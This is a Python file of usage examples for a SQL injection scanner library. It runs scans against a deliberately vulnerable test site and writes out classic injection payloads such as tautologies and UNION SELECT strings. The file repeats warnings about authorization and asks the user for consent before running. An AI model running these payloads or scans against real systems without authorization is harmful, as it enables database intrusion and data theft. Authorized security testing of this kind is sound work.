"""
Basic usage examples for SQLInjector
"""

import asyncio
from sqlinjector import SQLInjector, VulnerabilityScanner
from sqlinjector.models import ScanConfig, InjectionPoint, HttpMethod, InjectionType
from sqlinjector.payloads import PayloadManager

# ⚠️  WARNING: Only use on applications you own or have permission to test!

async def example_quick_scan():
    """Example: Quick vulnerability scan"""
    print("=== Quick Vulnerability Scan ===")
    
    config = ScanConfig(
        url="https://testphp.vulnweb.com/artists.php?artist=1",
        method=HttpMethod.GET,
        delay=1.0,  # Be respectful
        max_payloads_per_type=5
    )
    
    scanner = VulnerabilityScanner(config)
    result = await scanner.scan()
    
    print(f"Scan completed in {result.scan_duration:.2f} seconds")
    print(f"Total requests: {result.total_requests}")
    print(f"Vulnerabilities found: {len(result.vulnerabilities)}")
    
    if result.vulnerabilities:
        for vuln in result.vulnerabilities:
            print(f"  - {vuln.injection_type.value} in '{vuln.parameter}'")
            print(f"    Severity: {vuln.severity.value}")
            print(f"    Confidence: {vuln.confidence:.1%}")
    else:
        print("  No vulnerabilities detected")


async def example_test_specific_payload():
    """Example: Test a specific payload"""
    print("\n=== Testing Specific Payload ===")
    
    config = ScanConfig(
        url="https://testphp.vulnweb.com/artists.php",
        timeout=10.0
    )
    
    # Create injection point
    injection_point = InjectionPoint(
        parameter="artist",
        value="1",
        location="query",
        method=HttpMethod.GET
    )
    
    # Test specific payloads
    test_payloads = [
        "1 OR 1=1",
        "1' OR '1'='1",
        "1' UNION SELECT version()--"
    ]
    
    async with SQLInjector(config) as injector:
        results = await injector.test_injection_point_async(
            injection_point, 
            test_payloads
        )
        
        for result in results:
            print(f"\nPayload: {result.payload}")
            print(f"Status Code: {result.status_code}")
            print(f"Response Time: {result.response_time:.3f}s")
            print(f"Injection Detected: {result.injection_detected}")
            
            if result.injection_detected:
                print(f"Type: {result.injection_type.value}")
            
            if result.error_detected:
                print(f"Error: {result.error_message}")


async def example_custom_payloads():
    """Example: Using custom payloads"""
    print("\n=== Custom Payload Testing ===")
    
    manager = PayloadManager()
    
    # Generate custom payloads
    custom_payload = manager.generate_custom_payload(
        InjectionType.BOOLEAN_BLIND,
        "custom_test_123"
    )
    print(f"Generated custom payload: {custom_payload}")
    
    # Add custom payloads to manager
    custom_payloads = [
        "' AND 'custom'='custom",
        "' OR 'test'='test' --",
        "1 AND 1=1 /* custom test */"
    ]
    
    manager.add_custom_payloads(InjectionType.BOOLEAN_BLIND, custom_payloads)
    
    # Get updated payloads
    boolean_payloads = manager.get_payloads(InjectionType.BOOLEAN_BLIND, limit=5)
    print(f"\nBoolean payloads (including custom):")
    for i, payload in enumerate(boolean_payloads, 1):
        print(f"  {i}. {payload}")


def example_payload_statistics():
    """Example: Payload statistics"""
    print("\n=== Payload Statistics ===")
    
    manager = PayloadManager()
    stats = manager.get_payload_statistics()
    
    print("Available payloads by type:")
    for injection_type, count in stats.items():
        if not injection_type.startswith('total_'):
            print(f"  {injection_type.replace('_', ' ').title()}: {count}")
    
    print(f"\nTotal payloads: {stats['total_all']}")


async def example_database_detection():
    """Example: Database type detection"""
    print("\n=== Database Detection ===")
    
    manager = PayloadManager()
    detection_payloads = manager.get_detection_payloads()
    
    print("Database-specific detection payloads:")
    for db_type, payloads in detection_payloads.items():
        print(f"\n{db_type.upper()}:")
        for payload in payloads[:3]:  # Show first 3
            print(f"  - {payload}")


async def example_post_request_testing():
    """Example: Testing POST requests"""
    print("\n=== POST Request Testing ===")
    
    config = ScanConfig(
        url="https://testphp.vulnweb.com/login.php",
        method=HttpMethod.POST,
        data={
            "uname": "admin",
            "pass": "password"
        },
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "SQLInjector Security Test"
        },
        delay=1.0,
        max_payloads_per_type=3
    )
    
    scanner = VulnerabilityScanner(config)
    result = await scanner.scan()
    
    print(f"POST scan completed")
    print(f"Parameters tested: {', '.join(result.parameters_tested)}")
    print(f"Vulnerabilities: {len(result.vulnerabilities)}")


async def example_error_handling():
    """Example: Error handling"""
    print("\n=== Error Handling ===")
    
    # Test with invalid URL
    try:
        config = ScanConfig(
            url="https://nonexistent-domain-12345.com/test.php",
            timeout=5.0,
            max_payloads_per_type=1
        )
        
        scanner = VulnerabilityScanner(config)
        result = await scanner.scan()
        
    except Exception as e:
        print(f"Expected error caught: {type(e).__name__}: {e}")
    
    # Test with invalid injection point
    try:
        config = ScanConfig(url="https://httpbin.org/get", timeout=5.0)
        
        invalid_point = InjectionPoint(
            parameter="nonexistent",
            value="test",
            location="query",
            method=HttpMethod.GET
        )
        
        async with SQLInjector(config) as injector:
            results = await injector.test_injection_point_async(invalid_point, ["' OR 1=1--"])
        
    except Exception as e:
        print(f"Injection point error: {type(e).__name__}: {e}")


def example_config_management():
    """Example: Configuration management"""
    print("\n=== Configuration Management ===")
    
    # Create detailed configuration
    config = ScanConfig(
        url="https://example.com/search.php",
        method=HttpMethod.GET,
        headers={
            "User-Agent": "SQLInjector Security Scanner",
            "Accept": "text/html,application/xhtml+xml",
            "Accept-Language": "en-US,en;q=0.5"
        },
        cookies={
            "session": "abc123",
            "preferences": "dark_mode=1"
        },
        timeout=15.0,
        delay=0.5,
        max_retries=2,
        verify_ssl=True,
        injection_types=[
            InjectionType.BOOLEAN_BLIND,
            InjectionType.TIME_BLIND,
            InjectionType.ERROR_BASED
        ],
        test_parameters=["q", "category"],
        max_payloads_per_type=10
    )
    
    print("Configuration created:")
    print(f"  URL: {config.url}")
    print(f"  Method: {config.method.value}")
    print(f"  Headers: {len(config.headers)} headers")
    print(f"  Cookies: {len(config.cookies)} cookies")
    print(f"  Injection Types: {len(config.injection_types)}")
    print(f"  Test Parameters: {config.test_parameters}")


async def main():
    """Run all examples"""
    print("SQLInjector Usage Examples")
    print("=" * 50)
    print("⚠️  THESE EXAMPLES ARE FOR EDUCATIONAL PURPOSES ONLY")
    print("⚠️  ONLY TEST APPLICATIONS YOU OWN OR HAVE PERMISSION TO TEST")
    print("=" * 50)
    
    await example_quick_scan()
    await example_test_specific_payload()
    await example_custom_payloads()
    example_payload_statistics()
    await example_database_detection()
    await example_post_request_testing()
    await example_error_handling()
    example_config_management()
    
    print("\n" + "=" * 50)
    print("Examples completed!")
    print("\nRemember:")
    print("- Always get authorization before testing")
    print("- Use responsibly and ethically")
    print("- Report findings through proper channels")
    print("- Respect rate limits and target systems")


if __name__ == "__main__":
    # Legal disclaimer
    print("⚠️  LEGAL DISCLAIMER ⚠️")
    print("This tool is for authorized security testing only.")
    print("Unauthorized use is illegal and unethical.")
    print()
    
    response = input("Do you confirm you have authorization to run these tests? (yes/no): ")
    if response.lower() in ['yes', 'y']:
        asyncio.run(main())
    else:
        print("Examples cancelled. Only test systems you own or have permission to test.")
